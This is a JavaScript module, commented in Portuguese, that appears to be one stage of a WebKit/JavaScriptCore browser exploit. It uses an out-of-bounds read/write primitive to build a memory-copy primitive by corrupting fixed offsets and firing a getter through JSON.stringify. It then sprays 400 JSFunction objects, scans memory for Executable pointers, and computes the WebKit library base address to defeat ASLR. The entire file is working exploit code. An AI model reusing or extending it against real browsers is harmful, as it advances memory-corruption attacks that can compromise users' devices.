// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.31"; // Mantido como v10.31 conforme o log

const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_31";
const PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD = 0x6C;
const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;
const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x180; // Onde o QWORD lido será copiado

let getter_copy_called_flag_v10_31 = false;

// ============================================================
// PRIMITIVA DE CÓPIA DE MEMÓRIA (VALIDADA)
// ============================================================
async function readFromOOBOffsetViaCopy(dword_source_offset_to_read_from) {
    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy`;
    getter_copy_called_flag_v10_31 = false;

    if (!oob_array_buffer_real || !oob_dataview_real) {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) return new AdvancedInt64(0xDEADDEAD, 0xBADBAD);
    }
    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8); // Limpa destino

    const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0);
    oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD, value_to_plant_at_0x6c, 8);

    const getterObjectForCopy = {
        get [GETTER_PROPERTY_NAME_COPY]() {
            getter_copy_called_flag_v10_31 = true;
            try {
                const qword_at_0x68 = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
                const effective_read_offset = qword_at_0x68.high();
                if (effective_read_offset === dword_source_offset_to_read_from) {
                    if (effective_read_offset >= 0 && effective_read_offset < oob_array_buffer_real.byteLength - 8) {
                        const data_read = oob_read_absolute(effective_read_offset, 8);
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, data_read, 8);
                    } else { oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8); }
                } else { oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBAD68BAD, 0xBAD68BAD), 8); }
            } catch (e_getter) { try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){} }
            return "getter_copy_v10_31_done";
        }
    };
    oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
    await PAUSE_S3(5);
    try { JSON.stringify(getterObjectForCopy); } catch (e) { /* Ignora */ }
    if (!getter_copy_called_flag_v10_31) { return null; }
    return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
}

// ============================================================
// FUNÇÃO PRINCIPAL (v10.31 - Foco em Vazar Executable* de JSFunction)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.leakJSFunctionExecutable_v10.31`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Tentativa de Vazar Executable* de JSFunction ---`, "test", FNAME_CURRENT_TEST);

    let sprayedFunctions = [];

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        // 1. Validar Primitiva de Cópia (rápido)
        const VALIDATION_OFFSET = 0x280;
        const VALIDATION_QWORD = new AdvancedInt64(0x1122EEFF, 0x5566AABB);
        oob_write_absolute(VALIDATION_OFFSET, VALIDATION_QWORD, 8);
        let copied_validation = await readFromOOBOffsetViaCopy(VALIDATION_OFFSET);
        if (copied_validation && copied_validation.equals(VALIDATION_QWORD)) {
            logS3("  PASSO 1: Primitiva de cópia validada.", "good", FNAME_CURRENT_TEST);
        } else {
            logS3("  PASSO 1: FALHA na validação da primitiva de cópia. Abortando.", "critical", FNAME_CURRENT_TEST);
            return;
        }
        await PAUSE_S3(50);

        // 2. Pulverizar Objetos JSFunction
        logS3("PASSO 2: Pulverizando objetos JSFunction...", "info", FNAME_CURRENT_TEST);
        const NUM_SPRAY_FUNCS = 400; // Aumentar bastante
        for (let i = 0; i < NUM_SPRAY_FUNCS; i++) {
            sprayedFunctions.push(function(_a,_b,_c,_d,_e,_f,_g,_h,_i,_j) { // Função com mais argumentos para potencialmente aumentar tamanho do objeto FunctionExecutable
                let x = 0xFACEFEED; return _a + i + x + _j;
            });
        }
        logS3(`  ${sprayedFunctions.length} JSFunctions pulverizadas.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(500);

        // 3. Escanear o oob_array_buffer_real em busca de JSCells de JSFunction e seus Executable*
        const SCAN_START = 0x080;
        const SCAN_END = Math.min(0x7F00, oob_array_buffer_real.byteLength - 0x20); // Deixar margem para ler campos
        const SCAN_STEP = 0x08; // Alinhamento de QWORD

        logS3(`PASSO 3: Escaneando de ${toHex(SCAN_START)} a ${toHex(SCAN_END)} por Executable*...`, "info", FNAME_CURRENT_TEST);
        
        let webkitBaseLeaked = null;
        const executablePtrOffsetFromCell = JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET; // 0x18

        if (typeof executablePtrOffsetFromCell !== 'number') {
            logS3("ERRO: JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET não é um número!", "critical", FNAME_CURRENT_TEST);
            return;
        }

        for (let cell_base_offset = SCAN_START; cell_base_offset < SCAN_END; cell_base_offset += SCAN_STEP) {
            let potential_executable_ptr = await readFromOOBOffsetViaCopy(cell_base_offset + executablePtrOffsetFromCell);

            // CORREÇÃO: Substituir .isZero() pela checagem manual de .low() e .high()
            // e garantir que é um AdvancedInt64Object antes de acessar .low()/.high()
            if (potential_executable_ptr && isAdvancedInt64Object(potential_executable_ptr)) {
                const isActuallyZero = potential_executable_ptr.low() === 0 && potential_executable_ptr.high() === 0;
                const isErrorDeadBad = potential_executable_ptr.low() === 0xBADBAD && potential_executable_ptr.high() === 0xDEADDEAD;
                const isErrorBad68 = potential_executable_ptr.low() === 0xBAD68BAD && potential_executable_ptr.high() === 0xBAD68BAD;

                if (!isActuallyZero && !isErrorDeadBad && !isErrorBad68) {
                    // Heurística para ponteiro Executable* (pode apontar para código JIT ou dados WebKit)
                    // Geralmente são ponteiros de heap válidos ou ponteiros para regiões de código.
                    if (potential_executable_ptr.high() !== 0 && (potential_executable_ptr.low() & 0x7) === 0) { // Alinhado e parte alta não nula
                        logS3(`  [${toHex(cell_base_offset)}] Potencial JSFunction Cell. Valor em +${toHex(executablePtrOffsetFromCell)} (Potencial Executable*): ${potential_executable_ptr.toString(true)}`, "leak", FNAME_CURRENT_TEST);

                        // Tentar calcular a base do WebKit usando este ponteiro
                        for (const funcName in WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS) {
                            const funcOffsetStr = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS[funcName];
                            if (!funcOffsetStr || typeof funcOffsetStr !== 'string') continue;
                            try {
                                const funcOffsetAdv = new AdvancedInt64(funcOffsetStr);
                                const potential_base_addr = potential_executable_ptr.sub(funcOffsetAdv);

                                if ((potential_base_addr.low() & 0xFFF) === 0 && potential_base_addr.high() > 0x1000 && potential_base_addr.high() < 0x7FFF0000 ) {
                                    logS3(`    !!!! VAZAMENTO DE BASE DO WEBKIT POTENCIAL !!!!`, "vuln", FNAME_CURRENT_TEST);
                                    logS3(`      Ponteiro Executable* (lido de ${toHex(cell_base_offset + executablePtrOffsetFromCell)} via cópia): ${potential_executable_ptr.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
                                    logS3(`      Corresponde a '${funcName}' (offset config: ${funcOffsetAdv.toString(true)})`, "vuln", FNAME_CURRENT_TEST);
                                    logS3(`      Endereço Base Calculado: ${potential_base_addr.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
                                    document.title = `WebKit Base? ${potential_base_addr.toString(true)}`;
                                    webkitBaseLeaked = potential_base_addr;
                                    break; 
                                }
                            } catch (e_adv64) { /* Ignora */ }
                        }
                    }
                }
            }
            if (webkitBaseLeaked) break;
            if (cell_base_offset > SCAN_START && cell_base_offset % (SCAN_STEP * 128) === 0) { 
                logS3(`    Scan por Executable* em ${toHex(cell_base_offset)}...`, "info", FNAME_CURRENT_TEST);
                await PAUSE_S3(1); 
            }
        } // Fim do loop for

        if (webkitBaseLeaked) {
            logS3("VAZAMENTO DE ENDEREÇO BASE DO WEBKIT PARECE BEM-SUCEDIDO!", "good", FNAME_CURRENT_TEST);
        } else {
            logS3("Não foi possível vazar o endereço base do WebKit nesta execução via Executable*.", "warn", FNAME_CURRENT_TEST);
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        sprayedFunctions = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
